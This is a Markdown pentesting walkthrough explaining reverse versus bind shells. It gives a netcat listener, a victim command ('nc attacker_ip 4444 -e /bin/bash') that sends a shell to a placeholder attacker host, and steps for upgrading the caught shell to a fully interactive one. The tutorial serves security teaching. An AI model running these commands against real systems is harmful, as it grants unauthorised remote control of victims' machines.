# Reverse Shell Playbook/Walkthrough

## What is a reverse shell
A reverse shell is an activity that all attackers are looking to utilize as an objective in every engagement. There are many ways to 'pop' or 'catch' a reverse shell, and ultimately force a reverse shell to come back to you from a victim, but what even is that?

So normally when you have a service running on a machine, like Apache or IIS, you'll have an open port on that device, like port 80. As long as the network is configured with the proper port forwarding rules and VLAN configuration, users will be able to interact with the port over the network and gain access to their favorite website. This is what we'd consider a bind shell. In other words if I open a bind shell, I'm opening a port on the victim and connecting directly to it.

##### But there's a problem 

## Reasons why we use reverse shell over bind shell
A bind shell works great when you're directly connected to the same network that your victim is connected to. But what if this attack is happening over the internet? What if the victim is on another VLAN?

This is where a reverse shell comes in handy because you can force the victim to send a shell back to your attacker's machine, so it's essentially reversed. The attacker box becomes the server in this scenario so you never have to open a port on the victim.

You tell the victim to send a shell **_back to you_**.

This essentially bypasses the firewall issue that you'd have with a bind shell.

Without port forwarding rules already configured, from an external perspective a bind shell would be completely useless. 

By not requiring a port forwarding rule because firewalls allow all traffic outbound by default (known as egress fw rules), we don't have to worry about the firewall blocking us and our reverse shell will make it's way out of the network the same way every other packet does, via routing.

All we have to do is make sure we have our own local port forwarding rule on our local router forwarding the reverse shell from the WAN to our internal IP. It is possible to see this reverse shell and grab your public IP from the payload, but as a pentester doing ethical work, we're okay with that.

## Process for Reverse shell
- Listener (think: _'thing that catches reverse shell'_)
- Port Forwarding rule (think: _'thing that forwards reverse shell from router to kali'_)
- Payload (think: _'thing that sends you a reverse shell'_)

## Basic reverse shell
Open up port forwarding if doing attack over the internet

Attacker:
```
nc -nlvp 4444
```
Victim:
```
nc attacker_ip 4444 -e /bin/bash
```
#### Additional Shell Info
https://delta.navisec.io/reverse-shell-reference/

https://www.revshells.com/

#### Lazy upgrade way, works great on windows
```
sudo apt install rlwrap
rlwrap nc -lvp 4444
```

## Enable fully-interactive shell 
##### (allows tab complete, arrows keys, etc)(ONLY WORKS ON LINUX, use rlwrap in front of listener for windows)

#### Validate python or python3 on the machine
```
python -V
python3 -V
```
#### Make sure to use the correct version of python for next command
```
python -c 'import pty; pty.spawn("/bin/bash")' 
SHELL=/bin/bash script -q /dev/null (if your machine doesn't have python)
```
#### Next, background the shell to start sending raw input, this bypasses your local interpreter (shell) and sends your keystrokes to the reverse shell (victim)
```
Ctrl + Z (background the shell)
stty raw -echo; fg
reset
```
## If it asks what TERM to use, set it to 'xterm-256color'
### Validate Terminal Type
```
echo $TERM
export TERM=xterm-256color
echo $TERM
```
You should now be able to clear your terminal!

### Validate Shell for User
```
echo $SHELL
export SHELL=/bin/bash
echo $SHELL
```
### Validate size of screen
```
echo $TERM && tput lines && tput cols (run on attacker)
stty rows 38 columns 116 (run on victim)
```
Note: you'll want to run the second command with numbers from the first command, so you're setting the victim's shell size to your local kali machine's shell size. 
This helps prevent wordwrap from distorting and will help other tools like nano and vim work as expected.

You should now have a fully functional shell, where even sending a ^C (Ctrl + C, normally intended to stop processes) won't cause the shell to die. 
